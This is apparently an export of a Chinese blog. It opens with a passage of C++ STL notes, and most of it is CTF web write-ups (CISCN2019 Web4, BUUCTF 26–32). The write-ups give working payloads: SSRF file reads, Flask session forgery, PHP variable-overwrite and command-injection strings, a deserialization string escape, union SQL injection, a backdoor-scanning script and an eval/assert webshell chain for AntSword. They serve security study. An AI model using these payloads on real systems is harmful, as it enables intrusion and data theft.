adapter）等。\n\n\n算法不关心容器，容器不关心算法，通过迭代器解耦\n1.容器容器是用来存储数据的序列，它们提供了不同的存储方式和访问模式。\nSTL 中的容器可以分为三类：\n1、序列容器：存储元素的序列，允许双向遍历。\n\nstd::vector：动态数组，支持快速随机访问。\nstd::deque：双端队列，支持快速插入和删除。\nstd::list：链表，支持快速插入和删除，但不支持随机访问。\n\n2、关联容器：存储键值对，每个元素都有一个键（key）和一个值（value），并且通过键来组织元素。\n\nstd::set：集合，不允许重复元素。\nstd::multiset：多重集合，允许多个元素具有相同的键。\nstd::map：映射，每个键映射到一个值。\nstd::multimap：多重映射，存储了键值对（pair），其中键是唯一的，但值可以重复，允许一个键映射到多个值。\n\n3、无序容器（C++11 引入）：哈希表，支持快速的查找、插入和删除。\n\nstd::unordered_set：无序集合。\nstd::unordered_multiset：无序多重集合。\nstd::unordered_map：无序映射。\nstd::unordered_multimap：无序多重映射。\n\n示例代码\n#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std; int main()&#123;   // 创建一个向量存储 int   vector&lt;int&gt; vec;    int i;    // 显示 vec 的原始大小   cout &lt;&lt; &quot;vector size = &quot; &lt;&lt; vec.size() &lt;&lt; endl;    // 推入 5 个值到向量中   for(i = 0; i &lt; 5; i++)&#123;      vec.push_back(i);//无论是什么容器   &#125;    // 显示 vec 扩展后的大小   cout &lt;&lt; &quot;extended vector size = &quot; &lt;&lt; vec.size() &lt;&lt; endl;    // 访问向量中的 5 个值   for(i = 0; i &lt; 5; i++)&#123;      cout &lt;&lt; &quot;value of vec [&quot; &lt;&lt; i &lt;&lt; &quot;] = &quot; &lt;&lt; vec[i] &lt;&lt; endl;   &#125;    // 使用迭代器 iterator 访问值   vector&lt;int&gt;::iterator v = vec.begin();   while( v != vec.end()) &#123;      cout &lt;&lt; &quot;value of v = &quot; &lt;&lt; *v &lt;&lt; endl;      v++;   &#125;    return 0;&#125;\n\n运行结果\nvector size = 0extended vector size = 5value of vec [0] = 0value of vec [1] = 1value of vec [2] = 2value of vec [3] = 3value of vec [4] = 4value of v = 0value of v = 1value of v = 2value of v = 3value of v = 4\n\n我们可以看到，\n为了考试没办法了，只能直接记答案了\n\n\n\n容器类型\n常用写入方法\n考试频率\n时间复杂度\n\n\n\nvector\npush_back(), insert(), emplace_back()\n⭐⭐⭐⭐⭐\nO(1)摊销 &#x2F; O(n)\n\n\ndeque\npush_back(), push_front(), insert()\n⭐⭐⭐⭐\nO(1) &#x2F; O(n)\n\n\nlist\npush_back(), push_front(), insert()\n⭐⭐⭐⭐\nO(1)\n\n\narray\n下标赋值\n⭐⭐\nO(1)\n\n\nset&#x2F;map\ninsert(), emplace(), operator[]\n⭐⭐⭐⭐⭐\nO(log n)\n\n\nstack\npush()\n⭐⭐⭐\nO(1)\n\n\nqueue\npush()\n⭐⭐⭐\nO(1)\n\n\n我们在顶一个ser 和multiset的时候可以选择元素的排序方式\n#include &lt;set&gt;#include &lt;functional&gt;using namespace std;// 降序 setset&lt;int, greater&lt;int&gt;&gt; s;// 降序 multisetmultiset&lt;int, greater&lt;int&gt;&gt; ms;//默认是 less&lt;T&gt; 升序，也就是我们只需要记住greater就可以考试了\n\n","tags":["C++"]},{"title":"[CISCN2019_华东南赛区]Web4","url":"/2025/05/05/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/","content":"[CISCN2019_华东南赛区]Web4界面只有一个链接，我们点进去跳转至/read?url=https://baidu.com，这个直接可以怀疑ssrf漏洞了\n尝试了之后发现这个不是php的ssrf，这个代码猜测用的是flask写的，我们就只能使用local_file://进行文件读取\nlocal_file:///app/app.py拿到源码\nimport re, random, uuid, urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)app.debug = True@app.route(&#x27;/&#x27;)def index():    session[&#x27;username&#x27;] = &#x27;www-data&#x27;    return &#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;@app.route(&#x27;/read&#x27;)def read():    try:        url = request.args.get(&#x27;url&#x27;)        m = re.findall(&#x27;^file.*&#x27;, url, re.IGNORECASE)        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)        if m or n:            return &#x27;No Hack&#x27;        res = urllib.urlopen(url)        return res.read()    except Exception as ex:        print str(ex)    return &#x27;no response&#x27;@app.route(&#x27;/flag&#x27;)def flag():    if session and session[&#x27;username&#x27;] == &#x27;fuck&#x27;:        return open(&#x27;/flag.txt&#x27;).read()    else:        return &#x27;Access denied&#x27;if __name__==&#x27;__main__&#x27;:    app.run(        debug=True,        host=&quot;0.0.0.0&quot;    )\n\n我们直接看&#x2F;flag那个路由，发现当我们的session[‘name’]&#x3D;&#x3D;’fuck’的时候就直接拿到flag，我们先抓个包去看下SESSION\neyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aBi-EA.rLothaNy0qvRySnZ9O_w2F5labEbase64解码发现出现乱码，我们尝试使用jwt解码，发现本应该出现在json数据部分的username变成了头部，这估计和flask有关系我们把解码出来base64编码再解码一遍d3d3LWRhdGE=-&gt;www-data\n\n\n\n我们需要的就是伪造改变SESSION，但是jwt数据需要使用密匙才能过认证\n我们还需要获得密匙，我们先看这些代码\napp = Flask(__name__)random.seed(uuid.getnode())#获取到Mac地址，作为random的种子app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)#random为伪随机数，种子一样随机数也一样app.debug = True\n\n我们直接访问local_file:///sys/class/net/eth0/address拿到Mac地址\n\n\n现在麻烦的来了，wp说（Python2和Python3保留的位数不一样），所以我们需要使用python2去拿到密匙，搞得我又去下了python2\n\n\n我们拿到密匙之后还没完，我们用Jwt解码网站出现问题估计是Flask的SESSION格式和php的不一样，我们也不能直接用网站去加密，但是还好有专门进行flask加密的工具flask-session-cookie-manager\n而且这个工具对我们输入参数的格式有一点要求\npython flask_session_cookie_manager3.py encode -s 196.500240195 -t &quot;&#123;&#x27;username&#x27;:&#x27;fuck&#x27;&#125;&quot;#密匙不需要用引号包裹\n\n\n\n\n"},{"title":"Buuctf2.0","url":"/2025/03/29/Buuctf2-0/","content":"Buuctf2.0笔记前言上一篇buuctf的笔记也是写了25个题目了，感觉差不多了，再多下去就不好了。于是开启2.0版本\n26.[BJDCTF2020]Mark loves cat这题一开始也是给了我们源码，但是实际上这个源码应该要我们自己去拿到的\n我们先用dirsearch扫一下目录发现存在&#x2F;.git，我们再用githack把这个文件下载过来，拿到源码\n&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123;    $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123;\t//cat=flag&amp;flag=cat    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    exit($yds);&#125;//参数名里面必须有flagif($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    exit($is);\t//flag不能等于flag&#125;echo &quot;the flag is: &quot;.$flag;\n\n看了大佬的题解，我发现exit($is)会在退出脚本的时候输出变量，所以这题应该有4种解法，但我实力不行，看不懂源码，只能抄下payload\n方法1\n在开始判断之前，有两个赋值代码\nforeach($_POST as $x =&gt; $y)&#123;    $$x = $y;&#125;//把post传参实体化比如flag=cat—&gt;$flag=catforeach($_GET as $x =&gt; $y)&#123;    $$x = $$y;&#125;//对变量进行赋值flag=cat—&gt;$flag=$catforeach($_GET as $x =&gt; $y)&#123;\t//cat=flag&amp;flag=cat    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        exit($handsome);    &#125;&#125;\n\n我们可以通过第二个进行变量赋值，对$handsome进行赋值然后触发exit\n根据判断条件，我们需要?flag&#x3D;cat&amp;cat&#x3D;flag。当遍历flag&#x3D;cat的时候不会触发，但当cat&#x3D;flag时满足条件触发exit\npayload1:\n?handsome=flag&amp;flag=cat&amp;cat=flag?handsome=flag&amp;flag=handsome\n\n方法2\nif(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    exit($yds);&#125;\n\n这个比较容易，只需要进行变量覆盖即可\npayload2:\n?yds=flag\n\n方法3\nif($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    exit($is);\t//flag不能等于flag&#125;\n\npayload3:\n?is=flag&amp;flag=flag\n\n方法4\nforeach($_GET as $x =&gt; $y)&#123;\t//cat=flag&amp;flag=cat    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    exit($yds);&#125;//参数名里面必须有flagif($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    exit($is);\t//flag不能等于flag&#125;echo &quot;the flag is: &quot;.$flag;\n\n最后需要绕过上面所有条件，也是最难的一个方法，起初我以为只需要不触发exit()即可，比如传入flag=cat这样虽然可以绕过但是会被进行赋值$flag=$cat，这样$flag=null输出的时候就没有意义了\n但是我们可以利用变量赋值的先后顺序进行一个逃课\nhandsome=flag&amp;flag=handsome\n\n但是这样是利用了exit(handsome)，不算真正写出来了\n强制比较绕过\nget 传参数的时候，如果传入1，默认:做为键:类型是 int; 做为值，类型是 string\n问题就这这里了：$_GET[&#39;flag&#39;] === $x : 如果传入 a=flag&amp;flag=a 那么 判断 a=flag 的时候 $_GET[&#39;flag&#39;] 是 a, &amp;x 是 a，完全相等 进入if条件, 而如果传入 1=flag&amp;flag=1 那么判断 1=flag的时候 $_GET[&#39;flag&#39;] 是 (string)1 ，&amp;x 是 (int)1 不完全相等，无法进入if条件，进而绕过\npayload:\n1=flag&amp;flag=1\n\n利用的就是传参时数字作为键时是int而作为值时是string\n27.[WUSTCTF2020]朴实无华这个题目又是php特性的题目，我们首先访问&#x2F;robots.txt拿到&#x2F;fAke_f1agggg.php访问发现什么都没有，抓个包发现&#x2F;fl4g.php，我们直接找到源码\n&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123;    $get_flag = $_GET[&#x27;get_flag&#x27;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;\n\n这次分为3次绕过，\nlevel1\nif (isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;\n\n这个正常来看没办法，但是intval()是一个有很多漏洞的函数\n当php版本&lt;8的时候intval()对传入数据不会转科学计数法，我们可以试一下\n再利用php进行运算时的类型转化\n\n\n我们可以构造payload:\n?num=2e4\n\nlevel2\nif (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;\n\n我们需要找到一个字符串经过md5()编码后和字符串弱类型匹配相等\nmd5() 是 PHP 中用于计算字符串 MD5 哈希值的函数，生成一个 32 字符的十六进制数\n这个我们直接抄网上的payload:\nmd5=0e215962017\n\nlevel3\nif (isset($_GET[&#x27;get_flag&#x27;]))&#123;    $get_flag = $_GET[&#x27;get_flag&#x27;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;\n\n这里又是一个命令执行\npayload\nget_flag=ls//空格用$&#123;IFS&#125;绕过就行了\n\n最后我们在根目录下面发现一个很奇怪的文件里面有flag\npayload\nfl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n\n\n28.[安洵杯 2019]easy_serialize_php&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;//进行过滤，并替换为空if($_SESSION)&#123;    unset($_SESSION);&#125;//销毁变量$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;//写入数组extract($_POST);//实例化参数if(!$function)&#123;    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123;    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123;    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;//如果存在img_path则写入img否则则让img为空$serialize_info = filter(serialize($_SESSION));//对序列化结果进行过滤if($function == &#x27;highlight_file&#x27;)&#123;    highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123;    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; //反序列化后进行文件读取\n\n这个题目代码有点复杂，我们先分析一下\n分析完之后，发现有替换。看到替换就用字符串逃逸\n我们需要注意的是\n我们只有一个注入点，而且字符串替换减少，我们只能使用变量名逃逸\n$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;//写入数组extract($_POST);//实例化参数//假如我们传入POST _SESSION[&#x27;&#x27;]=&#x27;&#x27; 被实例化就会//$_SESSION[&#x27;&#x27;]=&#x27;&#x27; 这样会覆盖之前的$_SESSION数组//这样我们就可以控制变量名\n\n他说phpinfo()里面有东西，我们直接看看，全局搜索.php发现一个疑似flag的文件d0g3_f1ag.php我们先目标访问这个文件，base64编码ZDBnM19mMWFnLnBocA==\n$a[&#x27;&#x27;]=&#x27;1&#x27;;$a[&#x27;img&#x27;]=&#x27;ZDBnM19mMWFnLnBocA==&#x27;;echo serialize($a);//a:2:&#123;s:0:&quot;&quot;;s:0:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;//由于是进行变量名逃逸，我们需要截取//&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;//&quot;;s:0:&quot;&quot;; 是为了当变量名逃逸时充当value&lt;?phpfunction filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;$a[&#x27;&#x27;]=&#x27;&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;;$aa=serialize($a);echo filter($aa);//a:1:&#123;s:0:&quot;&quot;;s:48:&quot;&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;//&quot;;s:48:&quot; 有八个字符需要逃逸function filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;$a[&#x27;flagflag&#x27;]=&#x27;&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;;//我们用两个flag进行逃逸$aa=serialize($a);echo filter($aa);//a:1&#123;s:8:&quot;&quot;;s:48:&quot;&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;\n\npayload\n_SESSION[flagflag]=&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n\n不知道为什么flagflag不用加引号\n\n\n我们得到\n&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt;\n\n我们重新构造payload\n_SESSION[flagflag]=&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;\n\n\n\n\n\n\n\n29.[SWPU2019]Web1buu上面怎么这么多脑洞题，好多题目找题目就要好久\n这个题目还是比较好找，是一个二次注入的题目，在注入时发现过滤了\nor and -- # 空格 \n\n过滤掉空格的时候以为是无空格报错注入，但发现过滤掉or就过滤掉了order和information，导致无法直接拿到字段数和进行报错注入\n我们随便交一些特殊字符上去，查看广告详情的时候出现报错，于是锁定二次注入\n虽然过滤掉了or，但是把union select 放出来了，我们先使用注释代替空格把字段数给爆出来，发现一共有22个字段，最后面的引号随便闭合一下就行了\n1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;或者1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22\n\n发现2，3处有回显，我们直接开始注入\n1&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22#web11&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1#ads,users\n\n\n\n\n\n30.[强网杯 2019]高明的黑客这个题目有点奇怪，需要我们从几千个php文件当中找出存在命令执行漏洞的php文件\n\n\n我们先把www.tar.gz下载过来发现几千个PHP文件，直接找是不可能的，用大佬的脚本\nimport osimport requestsimport reimport threadingimport timeprint(&#x27;开始时间：  &#x27;+  time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100)  \t\t\t\t\t\t\t  \t\t\t#这儿设置最大的线程数filePath = r&quot;D:\\phpstudy_pro\\WWW\\src&quot;os.chdir(filePath)\t\t\t\t\t\t\t\t\t\t\t\t\t#改变当前的路径requests.adapters.DEFAULT_RETRIES = 5\t\t\t\t\t\t\t\t#设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False\t\t\t\t\t\t\t\t\t\t\t # 设置连接活跃状态为Falsedef get_content(file):    s1.acquire()    print(&#x27;trying   &#x27;+file+ &#x27;     &#x27;+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding=&#x27;utf-8&#x27;) as f:\t\t\t\t\t\t\t#打开php文件，提取所有的$_GET和$_POST的参数            gets = list(re.findall(&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read()))            posts = list(re.findall(&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read()))    data = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t#所有的$_POST    params = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t#所有的$_GET    for m in gets:        params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot;    for n in posts:        data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot;    url = &#x27;http://127.0.0.1/src/&#x27;+file    req = session.post(url, data=data, params=params)\t\t\t#一次性请求所有的GET和POST    req.close()\t\t\t\t\t\t\t\t\t\t\t\t# 关闭请求  释放内存    req.encoding = &#x27;utf-8&#x27;    content = req.text    #print(content)    if &quot;xxxxxx&quot; in content:\t\t\t\t\t\t\t\t\t#如果发现有可以利用的参数，继续筛选出具体的参数        flag = 0        for a in gets:            req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;)            content = req.text            req.close()\t\t\t\t\t\t\t\t\t\t\t\t# 关闭请求  释放内存            if &quot;xxxxxx&quot; in content:                flag = 1                break        if flag != 1:            for b in posts:                req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;)                content = req.text                req.close()\t\t\t\t\t\t\t\t\t\t\t\t# 关闭请求  释放内存                if &quot;xxxxxx&quot; in content:                    break        if flag == 1:\t\t\t\t\t\t\t\t\t\t\t\t\t#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，            param = a        else:            param = b        print(&#x27;找到了利用文件： &#x27;+file+&quot;  and 找到了利用的参数：%s&quot; %param)        print(&#x27;结束时间：  &#x27; + time.asctime(time.localtime(time.time())))    s1.release()for i in files:\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t#加入多线程   t = threading.Thread(target=get_content, args=(i,))   t.start()\n\n我们的路径记得放到phpstudy_pro/www/src这样才可以在本地部署项目\n\n\n这个脚本的原理应该就是在有get和post请求的文件中发送echo &#39;xxxxx&#39;如果在返回头中出现了xxxxx则代码被执行(echo被过滤了不就炸了吗)\n找到了利用文件： xk0SzyKwfzw.php  and 找到了利用的参数：Efa5BVG\n\n根据原理，我们直接往这个php文件进行命令执行即可\n\n\n尝试了发现这个变量被system()包起来了，直接命令执行\n源代码\n$XnEGfa = $_GET[&#x27;Efa5BVG&#x27;] ?? &#x27; &#x27;;$aYunX = &quot;sY&quot;;$aYunX .= &quot;stEmXnsTcx&quot;;//连接起来后变成 sYstEmXnsTcx$aYunX = explode(&#x27;Xn&#x27;, $aYunX);//用Xn隔开后//aYunX[0]=sYstEm [1]=sTcx$kDxfM = new stdClass();$kDxfM-&gt;gHht = $aYunX[0];($kDxfM-&gt;gHht)($XnEGfa);\n\n\n\n31.[NPUCTF2020]ReadlezPHP &lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;        $this-&gt;b = &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]);2025-04-02 07:28:28\n\n这个题目一看就是反序列化和命令执行，但是当我执行system()的时候发现不知道为什么没输出，看了wp才知道命令执行的各种函数都被过滤掉了\nassert() 是 PHP 中的一个调试函数，用于在代码中插入断言检查。断言是一种开发阶段的调试机制，用于验证程序中的某些条件是否为真。\n就是看代码的执行条件是否为真，重点在于执行代码，但是在php8以后这里面只允许出现布尔表达式，php7通过配置文件设定，php5则直接用就行了\n还有就是，这题谁知道flag在phpInfo()里面\n&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &quot;phpinfo()&quot;;        $this-&gt;b = &quot;assert&quot;;    &#125;    public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;&#125;$c = new HelloPhp;echo serialize($c);\n\n\n\n\n\n32.[极客大挑战 2019]RCE ME&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123;            $code=$_GET[&#x27;code&#x27;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;\n\nphp命令执行的题目，过滤掉了字母和数字，我们直接使用取反或者异或拼接绕过即可\n重点在于这题不能直接命令执行，flag藏得很深，我们需要用到蚁剑连接，但是@eval()我好像不知道怎么连接蚁剑\n失败@eval($_POST[&#39;pass&#39;]),我们之前连接蚁剑都是上传一个php文件去连接的，那个是php文件，属于永久性后门，但是这个代码是一次性执行的，也就是为什么有时候可以命令执行但是不能用蚁剑\n//蚁剑默认payload@eval($_POST[&#x27;ant&#x27;]);  // 蚁剑默认用 &#x27;ant&#x27; 作为连接密码//如果直接传入$_POST[&#x27;code&#x27;] = &#x27;@eval($_POST[&quot;ant&quot;]);&#x27;;//它会被执行，但仅限当前请求，无法建立持久化连接。\n\n问题：\n\n如果只是 eval($_POST[&#39;code&#39;])，它只执行一次，不会在服务器上留下持久化后门。\n蚁剑无法通过 POST[&#39;ant&#39;] 持续交互，因为没有持久化的 webshell。\n\n失败eval(eval($_POST[&#39;test&#39;]))\n如果是 eval(eval($_POST[&#39;test&#39;]))：\n\n内层 eval 执行 $_POST[&#39;test&#39;]（如 @eval($_POST[&#39;ant&#39;]);），但没有返回值（返回 NULL）。\n外层 eval 尝试执行 NULL → 报错或无操作，导致蚁剑无法建立连接。\n\n也是一次性的原因，执行了一次之后就不会继续。\n这时候我们就需要使用到\neval(assert(eval($_POST[&#x27;test&#x27;])));\n\n当蚁剑发送 payload 时，执行顺序如下：\n\n最内层 eval($_POST[&#39;test&#39;])\n执行 $_POST[&#39;test&#39;] 的内容（比如蚁剑的 payload @eval($_POST[&#39;ant&#39;]);）。\n返回值：如果 eval 的代码没有显式 return，默认返回 NULL。\n\n\nassert() 的作用\nassert 会把传入的字符串当作 PHP 代码执行（即使传入的是 NULL，它也会尝试执行）。\n如果 eval($_POST[&#39;test&#39;]) 返回的是代码（如 @eval($_POST[&#39;ant&#39;]);），assert 会执行它。\n返回值：assert 返回 true&#x2F;false（取决于代码是否执行成功）。\n\n\n最外层 eval()\n尝试执行 assert 的返回值（true&#x2F;false），但由于 true&#x2F;false 不是有效 PHP 代码，这里无实际作用。\n\n\n\n我们实际上是通过assert()去执行代码，内层eval()执行的是获取POST请求的作用\n取反绕过\n&lt;?phperror_reporting(0);$a=&#x27;assert&#x27;;$b=urlencode(~$a);echo $b;//%9E%8C%8C%9A%8D%8Becho &quot;&lt;br&gt;&quot;;$c=&#x27;(eval($_POST[test]))&#x27;;$d=urlencode(~$c);echo 